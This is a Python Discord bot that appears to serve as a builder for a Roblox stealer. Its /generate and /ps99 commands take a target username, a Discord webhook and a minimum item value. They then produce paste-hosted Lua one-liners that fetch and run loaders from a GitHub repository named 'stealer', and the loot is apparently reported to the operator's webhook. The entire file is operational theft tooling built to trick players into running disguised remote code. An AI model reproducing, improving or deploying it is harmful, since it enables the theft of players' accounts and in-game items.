import os
import time
import asyncio
import discord
from discord import app_commands
from discord.ext import commands
import httpx
from dotenv import load_dotenv

load_dotenv()

token = os.environ["discord_bot_token"]
protector = os.environ["protector_url"].rstrip("/")
secret = os.environ["admin_secret"]
guild_id = int(os.environ.get("allowed_guild_id", "0"))
pastefy_key = os.environ.get("pastefy_api_key", "")

pastefy_base = "https://pastefy.app/api/v2"
roblox_search = "https://users.roblox.com/v1/users/search"
cache_ttl = 60
name_cache = {}
paste_lock = asyncio.Lock()
used_names = set()

ps99_loader = "https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-ps99"
main_loader = "https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/loader"

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree


async def check_name(name: str) -> tuple[bool, str]:
    key = name.lower()
    now = time.time()
    if key in name_cache:
        expires, exists = name_cache[key]
        if now < expires:
            return (True, "ok") if exists else (False, "invalid user")

    try:
        async with httpx.AsyncClient(timeout=5) as client:
            resp = await client.get(
                roblox_search,
                params={"keyword": name, "limit": 10},
            )
    except httpx.RequestError as e:
        print(f"roblox api down: {e}")
        return True, "ok"

    if resp.status_code != 200:
        print(f"roblox api status {resp.status_code}")
        return True, "ok"

    data = resp.json()
    names = [u.get("name", "").lower() for u in data.get("data", [])]
    exists = name.lower() in names

    name_cache[key] = (now + cache_ttl, exists)

    return (True, "ok") if exists else (False, "invalid user")


async def make_paste(content: str, title: str) -> str | None:
    if not pastefy_key:
        print("no pastefy key set")
        return None

    async with paste_lock:
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                resp = await client.post(
                    f"{pastefy_base}/paste",
                    json={
                        "title": title,
                        "content": content,
                    },
                    headers={
                        "Authorization": f"Bearer {pastefy_key}",
                        "Content-Type": "application/json",
                    },
                )
            if resp.status_code in (200, 201):
                data = resp.json()
                paste_data = data.get("paste", {})
                paste_id = paste_data.get("id")
                if paste_id:
                    return f"https://pastefy.app/{paste_id}/raw"
                else:
                    print(f"no id in response: {data}")
            else:
                print(f"pastefy error: {resp.status_code} - {resp.text}")
        except httpx.RequestError as e:
            print(f"pastefy request error: {e}")
        except Exception as e:
            print(f"pastefy unexpected error: {e}")

    return None


async def check_webhook(url: str) -> bool:
    if "discord.com/api/webhooks/" not in url and "discordapp.com/api/webhooks/" not in url:
        return False

    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.get(url)
        if resp.status_code == 200:
            data = resp.json()
            return "id" in data and "token" in data
    except httpx.RequestError:
        pass

    return False


@bot.event
async def on_ready():
    if guild_id:
        guild = discord.Object(id=guild_id)
        tree.copy_global_to(guild=guild)
        await tree.sync(guild=guild)
    else:
        await tree.sync()
    print(f"ready as {bot.user}")


@tree.command(name="generate", description="generate script with token")
@app_commands.describe(
    username="target username",
    webhook="discord webhook url",
)
async def generate(interaction: discord.Interaction, username: str, webhook: str):
    await interaction.response.defer(ephemeral=True)

    if not await check_webhook(webhook):
        await interaction.followup.send("invalid webhook", ephemeral=True)
        return

    valid, reason = await check_name(username)
    if not valid:
        await interaction.followup.send(f"{reason}", ephemeral=True)
        return

    if username.lower() in used_names:
        await interaction.followup.send("name already used", ephemeral=True)
        return

    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.post(
                f"{protector}/api/v3/token/register",
                json={"webhook_url": webhook, "username": username},
                headers={"x-admin-secret": secret},
            )
    except httpx.RequestError as e:
        await interaction.followup.send(f"protector unreachable: `{e}`", ephemeral=True)
        return

    if resp.status_code != 200:
        await interaction.followup.send(
            f"api error `{resp.status_code}`: {resp.text[:200]}", ephemeral=True
        )
        return

    data = resp.json()
    generated_token = data.get("token", "unknown")
    used_names.add(username.lower())

    raw_script = f'user = "{username}"\nid = "{generated_token}"\nloadstring(game:HttpGet("{main_loader}", true))()'

    paste_link = await make_paste(raw_script, f"{username}_loader")

    if paste_link:
        pc_script = f'loadstring(game:HttpGet("{paste_link}", true))()'
        mobile_script = f"loadstring(game:HttpGet('{paste_link}', true))()"

        embed = discord.Embed(
            title="generated!",
            color=0x57F287,
        )
        embed.add_field(
            name="pc copy:",
            value=f"```lua\n{pc_script}\n```",
            inline=False,
        )
        embed.add_field(
            name="mobile copy:",
            value=f"`{mobile_script}`",
            inline=False,
        )

        await interaction.followup.send(embed=embed, ephemeral=True)
    else:
        embed = discord.Embed(
            title="generated! (raw)",
            description="pastefy unavailable, here's the raw script",
            color=0x57F287,
        )
        embed.add_field(
            name="script",
            value=f"```lua\n{raw_script}\n```",
            inline=False,
        )

        await interaction.followup.send(embed=embed, ephemeral=True)


@tree.command(name="ps99", description="generate ps99 script")
@app_commands.describe(
    user="target username",
    webhook="discord webhook url",
    minrap="minimum rap value",
)
async def ps99(interaction: discord.Interaction, user: str, webhook: str, minrap: int):
    await interaction.response.defer(ephemeral=True)

    if not await check_webhook(webhook):
        await interaction.followup.send("invalid webhook", ephemeral=True)
        return

    valid, reason = await check_name(user)
    if not valid:
        await interaction.followup.send(f"{reason}", ephemeral=True)
        return

    raw_script = f'user = "{user}"\nwebhook = "{webhook}"\nminrap = {minrap}\nloadstring(game:HttpGet("{ps99_loader}", true))()'

    paste_link = await make_paste(raw_script, f"ps99_{user}")

    if paste_link:
        pc_script = f'loadstring(game:HttpGet("{paste_link}", true))()'
        mobile_script = f"loadstring(game:HttpGet('{paste_link}', true))()"

        embed = discord.Embed(
            title="generated!",
            color=0x57F287,
        )
        embed.add_field(
            name="pc copy:",
            value=f"```lua\n{pc_script}\n```",
            inline=False,
        )
        embed.add_field(
            name="mobile copy:",
            value=f"`{mobile_script}`",
            inline=False,
        )

        await interaction.followup.send(embed=embed, ephemeral=True)
    else:
        embed = discord.Embed(
            title="generated! (raw)",
            description="pastefy unavailable, here's the raw script",
            color=0x57F287,
        )
        embed.add_field(
            name="script",
            value=f"```lua\n{raw_script}\n```",
            inline=False,
        )

        await interaction.followup.send(embed=embed, ephemeral=True)


bot.run(token)
